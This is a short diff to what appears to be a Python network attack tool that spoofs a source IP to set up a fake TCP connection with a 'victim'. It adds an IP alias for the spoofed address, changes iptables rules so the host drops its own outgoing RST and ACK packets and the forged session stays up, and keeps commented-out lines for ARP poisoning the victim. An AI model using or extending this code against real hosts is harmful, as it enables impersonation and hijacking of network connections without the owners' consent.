@@ -108,7 +108,8 @@ def initialize_fake_connection(src_ip, dst_ip):
 	dst_port = victim_port
 	print(f'Spoofing with IP ({src_ip} : {src_port}) to IP ({dst_ip} : {dst_port})...')
 
-	terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP')
+	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP')
+	#terminal(f'sudo iptables -t nat -I POSTROUTING -o eth0 -d 1.2.3.4/0 -s 192.168.100.1 -j SNAT --to-source 192.168.100.2')
 	#terminal(f'iptables -t raw -A PREROUTING -p tcp -s {src_ip} -j DROP')
 
 	spoof_interface = ip_alias(src_ip)
@@ -116,6 +117,13 @@ def initialize_fake_connection(src_ip, dst_ip):
 	print(f'Successfully set up IP alias on interface {spoof_interface}')
 	print('Resulting ifconfig interface:')
 	print(terminal(f'ifconfig {spoof_interface}').rstrip() + '\n')
+
+	print('Setting up iptables configurations')
+	terminal(f'sudo iptables -I OUTPUT -s {src_ip} -p tcp --tcp-flags ALL RST,ACK -j DROP')
+	#terminal(f'sudo iptables -I OUTPUT -s {src_ip} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
+	#terminal(f'sudo iptables -I OUTPUT -s {src_ip} -p tcp --tcp-flags ALL FIN -j DROP')
+	#terminal(f'sudo iptables -I OUTPUT -s {src_ip} -p tcp --tcp-flags ALL RST -j DROP')
+
 
 	#print('ARP poisoning victim...')
 	#mac_address = get_mac_address(spoof_interface)
